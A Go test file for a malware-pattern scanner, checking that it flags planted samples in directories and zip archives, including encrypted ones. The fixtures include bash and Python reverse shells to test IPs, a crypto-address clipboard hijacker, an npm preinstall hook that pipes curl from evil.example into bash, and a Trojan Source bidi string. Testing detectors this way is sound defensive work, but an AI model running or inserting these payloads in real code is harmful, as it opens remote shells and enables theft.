package codescan

import (
	"archive/zip"
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"testing"

	"security-go-scanner/src/model"
	"security-go-scanner/src/runner"
)

func TestCodeScanCleanRepo(t *testing.T) {
	d := t.TempDir()
	_ = os.WriteFile(filepath.Join(d, "main.go"), []byte("package main\n\nfunc main() {}\n"), 0o644)
	_ = os.WriteFile(filepath.Join(d, "README.md"), []byte("# My clean project\n"), 0o644)

	rep, err := ScanDirectory(d, model.SevInfo)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if rep.Verdict != "no_indicators_found" {
		t.Fatalf("expected clean verdict, got %s", rep.Verdict)
	}
	if len(rep.Findings) != 0 {
		t.Fatalf("expected 0 findings, got %d", len(rep.Findings))
	}
}

func TestCodeScanMalwarePatterns(t *testing.T) {
	d := t.TempDir()

	// 1. Reverse shell in script
	_ = os.WriteFile(filepath.Join(d, "shell.sh"), []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"), 0o644)

	// 2. Clipboard address hijacker combo in js
	clipCode := `
function check() {
    let t = navigator.clipboard.readText();
    let re = /0x[a-fA-F0-9]{40}/;
    if (re.test(t)) {
        navigator.clipboard.writeText("0x1111111111111111111111111111111111111111");
    }
}
`
	_ = os.WriteFile(filepath.Join(d, "clip.js"), []byte(clipCode), 0o644)

	// 3. package.json risky preinstall
	pkgJson := `{"name":"pkg","scripts":{"preinstall":"curl -sL https://evil.example/setup | bash"}}`
	_ = os.WriteFile(filepath.Join(d, "package.json"), []byte(pkgJson), 0o644)

	// 4. Double extension
	_ = os.WriteFile(filepath.Join(d, "invoice.pdf.exe"), []byte("MZfakepe"), 0o644)

	rep, err := ScanDirectory(d, model.SevInfo)
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}

	if rep.Verdict != "indicators_found_review_required" {
		t.Fatalf("expected indicators_found_review_required, got %s", rep.Verdict)
	}

	foundRules := map[string]bool{}
	for _, f := range rep.Findings {
		foundRules[f.Rule] = true
	}

	expected := []string{"rs-bash-devtcp", "clip-hijack-combo", "npm-lifecycle", "file-double-ext"}
	for _, exp := range expected {
		if !foundRules[exp] {
			t.Errorf("missing expected rule hit: %s (found: %v)", exp, foundRules)
		}
	}
}

func TestCodeScanZipInMemory(t *testing.T) {
	d := t.TempDir()
	zipPath := filepath.Join(d, "target_archive.zip")

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	f1, _ := zw.Create("hello.txt")
	_, _ = f1.Write([]byte("Hello safe world"))

	f2, _ := zw.Create("src/connect.py")
	pyCode := `import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("1.2.3.4", 9001))
os.dup2(s.fileno(), 0)
subprocess.call(["/bin/sh", "-i"])
`
	_, _ = f2.Write([]byte(pyCode))

	_ = zw.Close()
	_ = os.WriteFile(zipPath, buf.Bytes(), 0o644)

	rep, err := ScanZipInMemory(zipPath, "", model.SevInfo)
	if err != nil {
		t.Fatalf("ScanZipInMemory error: %v", err)
	}

	if rep.Verdict != "indicators_found_review_required" {
		t.Fatalf("expected indicators_found_review_required, got %s", rep.Verdict)
	}

	found := false
	for _, f := range rep.Findings {
		if f.Rule == "rs-py-socket-shell" {
			found = true
			if f.File != "src/connect.py" {
				t.Errorf("expected file src/connect.py, got %s", f.File)
			}
		}
	}
	if !found {
		t.Fatalf("did not detect rs-py-socket-shell in in-memory zip scan: %v", rep.Findings)
	}

	// Verify that nothing was extracted or written to disk in temp dir
	entries, _ := os.ReadDir(d)
	if len(entries) != 1 || entries[0].Name() != "target_archive.zip" {
		t.Fatalf("unexpected files written to disk during zip scan: %v", entries)
	}
}

func TestTrojanSourceBidi(t *testing.T) {
	d := t.TempDir()
	bidiCode := "var isAdmin = false; /* \u202E } \u2066 if (isAdmin) \u2069 \u2066 */"
	_ = os.WriteFile(filepath.Join(d, "auth.js"), []byte(bidiCode), 0o644)

	rep, err := ScanDirectory(d, model.SevInfo)
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}

	found := false
	for _, f := range rep.Findings {
		if f.Rule == "src-bidi" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected src-bidi finding for Trojan Source Unicode, got: %v", rep.Findings)
	}
}

func TestCodeScanEncryptedZip(t *testing.T) {
	if !runner.Have("zip") {
		t.Skip("zip binary not found")
	}

	d := t.TempDir()
	payloadFile := filepath.Join(d, "exploit.sh")
	_ = os.WriteFile(payloadFile, []byte("/bin/bash -i >& /dev/tcp/1.2.3.4/8080 0>&1\n"), 0o644)

	zipPath := filepath.Join(d, "protected.zip")
	cmd := exec.Command("zip", "-P", "malwarePass", zipPath, payloadFile)
	if err := cmd.Run(); err != nil {
		t.Fatalf("failed to create encrypted zip: %v", err)
	}

	enc, err := IsZipFileEncrypted(zipPath)
	if err != nil || !enc {
		t.Fatalf("expected IsZipFileEncrypted=true, got %v, err=%v", enc, err)
	}

	// 1. Without password: must flag zip-encrypted-payload (HIGH), NEVER false-clean!
	repNoPw, err := ScanZipInMemory(zipPath, "", model.SevInfo)
	if err != nil {
		t.Fatalf("ScanZipInMemory without pw failed: %v", err)
	}
	foundEnc := false
	for _, f := range repNoPw.Findings {
		if f.Rule == "zip-encrypted-payload" {
			foundEnc = true
			break
		}
	}
	if !foundEnc {
		t.Fatalf("expected zip-encrypted-payload finding when password was not given, got: %v", repNoPw.Findings)
	}
	if repNoPw.Verdict != "indicators_found_review_required" {
		t.Fatalf("expected encrypted zip to trigger review, got verdict: %s", repNoPw.Verdict)
	}

	// 2. With password and 7z: decrypts and identifies the payload
	if runner.Have("7z") {
		repWithPw, err := ScanZipInMemory(zipPath, "malwarePass", model.SevInfo)
		if err != nil {
			t.Fatalf("ScanZipInMemory with pw failed: %v", err)
		}
		foundPayload := false
		for _, f := range repWithPw.Findings {
			if f.Rule == "rs-bash-devtcp" {
				foundPayload = true
				break
			}
		}
		if !foundPayload {
			t.Fatalf("expected decrypted zip to reveal rs-bash-devtcp, got: %v", repWithPw.Findings)
		}
	}
}

